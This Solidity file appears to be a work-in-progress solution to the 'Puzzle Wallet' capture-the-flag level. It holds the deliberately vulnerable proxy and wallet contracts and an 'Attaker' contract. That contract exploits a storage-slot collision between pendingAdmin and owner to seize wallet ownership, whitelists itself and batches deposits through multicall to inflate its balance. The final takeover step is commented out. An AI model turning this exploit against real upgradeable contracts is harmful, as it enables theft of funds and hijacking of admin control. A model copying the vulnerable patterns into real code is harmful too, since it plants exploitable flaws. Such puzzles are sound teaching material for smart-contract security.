// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

abstract contract UpgradeableProxy {
    // Storage slot with the address of the current implementation.
    // The keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1.
    bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // Event to emit when implementation is upgraded
    event Upgraded(address indexed implementation);

    constructor(address _implementation, bytes memory _initData) {
        _setImplementation(_implementation);
        (bool success,) = _implementation.delegatecall(_initData);
        require(success, "Initialization failed");
    }

    fallback() external payable {
        console.log("fallback!!!!");
        _delegate(_implementation());
    }

    receive() external payable {
        console.log("receive");
        _delegate(_implementation());
    }

    function _implementation() internal view returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    function _setImplementation(address newImplementation) private {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }

    function _upgradeTo(address newImplementation) internal {
        require(_implementation() != newImplementation, "Already using this implementation");
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    function _delegate(address implementation) internal {
        console.log("delegate", implementation);

        assembly {
            calldatacopy(0, 0, calldatasize())

            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin; // slot0
    address public admin; // slot1

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        console.log("approveNewAdmin!!!");
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner; // slot0
    uint256 public maxBalance; // slot1
    mapping(address => bool) public whitelisted; // slot2
    mapping(address => uint256) public balances; // slot3

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        console.log("onlyWhitelisted");
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        console.log("address(this).balance", address(this).balance);
        console.log("maxBalance", maxBalance);

        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;

        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];

            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }

            // console.log('BOOL', selector == this.deposit.selector);
            // console.log('BYTES_1');
            // console.logBytes(abi.encodeWithSelector(this.deposit.selector));
            // console.log('BYTES_2');
            // console.logBytes(abi.encodeWithSelector(selector));
            // console.log('BYTES_3');

            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            console.log("address(this)", address(this));
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Attaker {
    address private proxy;
    address private owner;
    address private wallet;

    constructor(address _proxy, address _wallet) {
        owner = msg.sender;
        proxy = _proxy;
        wallet = _wallet;
    }

    fallback() external payable {
        console.log("Attaker_fallback");
    }

    receive() external payable {
        console.log("Attaker_receive");
    }

    function attack() public {
        require(msg.sender == owner, "Not the owner");

        (bool success,) = proxy.call(abi.encodeWithSignature("proposeNewAdmin(address)", address(this)));
        require(success, "Propose new admin failed");

        (bool success1,) = proxy.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, address(this)));
        require(success1, "Add to whitelist failed");

        // (bool success2, ) = proxy.call{ value: 1e18 }(abi.encodeWithSelector(PuzzleWallet.deposit.selector));
        // console.log('success2', success2);

        bytes[] memory callData = new bytes[](5);
        callData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        callData[1] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        callData[2] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        callData[3] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        callData[4] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        (bool success2,) = proxy.call{value: 1e18}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, callData));
        console.log("success2", success2);

        // (bool success2, ) = proxy.call(abi.encodeWithSelector(PuzzleWallet.setMaxBalance.selector, address(this)));
        // require(success2, 'Set max balance failed');
    }
}
